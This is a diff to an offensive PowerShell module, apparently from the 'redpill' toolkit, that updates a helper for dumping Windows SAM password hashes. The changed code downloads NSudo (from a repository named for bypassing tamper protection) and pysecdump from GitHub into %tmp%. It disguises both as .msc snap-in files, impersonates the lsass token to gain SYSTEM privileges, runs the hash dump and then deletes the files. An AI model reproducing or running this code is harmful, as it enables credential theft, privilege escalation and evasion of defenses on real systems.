@@ -6,8 +6,8 @@
    Author: @mubix|@r00t-3xp10it
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: Invoke-WebRequest|BitsTransfer
-   Optional Dependencies: GetSystem.exe|pysecdump.exe
-   PS cmdlet Dev version: v2.2.5
+   Optional Dependencies: BCDstore.msc|perfmon.msc|
+   PS cmdlet Dev version: v2.2.6
 
 .DESCRIPTION
    -GetPasswords [ Enum ] search creds in wstore\reg\disk diferent locations.
@@ -74,18 +74,18 @@ If($GetPasswords -ieq "Enum"){
       <#
       .SYNOPSIS
          Author: @pentestlab|@r00t-3xp10it
-         Helper - Dump SAM hashs
+         Helper - Dump SAM hashs (in-memory)
 
       .DESCRIPTION
-         This function downloads GetSystem and pysecdump standalone executables to
-         %tmp% directory and masquerade bouth binarys as windows snap-in.msc format.
-         GetSystem will impersonate lsass token (NT AUTHORITY/SYSTEM) to be abble to
-         spawn pysecdump (dump hashs) child process with parent process inherit privs.
+         This function downloads BCDstore.msc and perfmon.msc standalone executables
+         to %tmp% directory and masquerade bouth binarys as windows snap-in.msc appl.
+         BCDstore will impersonate lsass token (NT AUTHORITY/SYSTEM) to be abble to
+         spawn perfmon (dump hashs) child process with parent process inherit privs.
 
       .NOTES
          Required Dependencies: Invoke-WebRequest
          Required Dependencies: Adminstrator privileges
-         Required Dependencies: GetSystem.exe and pysecdump.exe
+         Required Dependencies: BCDstore.msc and perfmon.msc
       #>
 
       ## Build Trigger bat script on %tmp% { to execute perfmon.msc @args }
@@ -94,23 +94,23 @@ If($GetPasswords -ieq "Enum"){
       echo "exit"|Add-Content $Env:TMP\setup.bat -encoding ascii
 
       ## Download and masquerade the required standalone executables
-      If(-not(Test-Path -Path "$Env:TMP\diskmgmt.msc" -EA SilentlyContinue)){
-         iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/GetSystem.exe -OutFile $Env:TMP\diskmgmt.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
+      If(-not(Test-Path -Path "$Env:TMP\BCDstore.msc" -EA SilentlyContinue)){
+         iwr -Uri https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -OutFile $Env:TMP\BCDstore.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
       }
       If(-not(Test-Path -Path "$Env:TMP\perfmon.msc" -EA SilentlyContinue)){
          iwr -Uri https://raw.githubusercontent.com/pentestmonkey/pysecdump/master/pysecdump.exe -OutFile $Env:TMP\perfmon.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
       }
 
-      If(-not(Test-Path -Path "$Env:TMP\diskmgmt.msc" -EA SilentlyContinue)){
+      If(-not(Test-Path -Path "$Env:TMP\BCDstore.msc" -EA SilentlyContinue)){
 
-         Write-Host "[error] fail to download: $Env:TMP\diskmgmt.msc!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "[error] fail to download: $Env:TMP\BCDstore.msc!" -ForegroundColor Red -BackgroundColor Black
 
       }Else{
 
          ## Execute SAM dump
-         # diskmgmt.msc will impersonate lsass token (NT AUTHORITY/SYSTEM) to be abble to
+         # BCDstore.msc will impersonate lsass token (NT AUTHORITY/SYSTEM) to be abble to
          # spawn perfmon.msc (dump hashs) child process with parent process inherit privs.
-         cd $Env:TMP;.\diskmgmt.msc ".\setup.bat" "lsass"
+         cd $Env:TMP;.\BCDstore.msc -U:T -P:E cmd.exe /R setup.bat
          cd $Working_Directory ## Return to redpill working directory
 
          ## Read pysecdump logfile { diskmgmt.log }
@@ -257,8 +257,8 @@ If($GetPasswords -ieq "Enum"){
         If(Test-Path -Path "$Env:TMP\setup.bat"){Remove-Item -Path "$Env:TMP\setup.bat" -Force}
         If(Test-Path -Path "$Env:TMP\passwd.txt"){Remove-Item -Path "$Env:TMP\passwd.txt" -Force}
         If(Test-Path -Path "$Env:TMP\perfmon.msc"){Remove-Item -Path "$Env:TMP\perfmon.msc" -Force}
-        If(Test-Path -Path "$Env:TMP\diskmgmt.msc"){Remove-Item -Path "$Env:TMP\diskmgmt.msc" -Force}
         If(Test-Path -Path "$Env:TMP\diskmgmt.log"){Remove-Item -Path "$Env:TMP\diskmgmt.log" -Force}
+        If(Test-Path -Path "$Env:TMP\BCDstore.msc"){Remove-Item -Path "$Env:TMP\BCDstore.msc" -Force}
         If(Test-Path -Path "$Env:TMP\Wdlogfile.log"){Remove-Item -Path "$Env:TMP\Wdlogfile.log" -Force}
         If(Test-Path -Path "$Env:TMP\DecryptAutoLogon.msc"){Remove-Item -Path "$Env:TMP\DecryptAutoLogon.msc" -Force}
      }
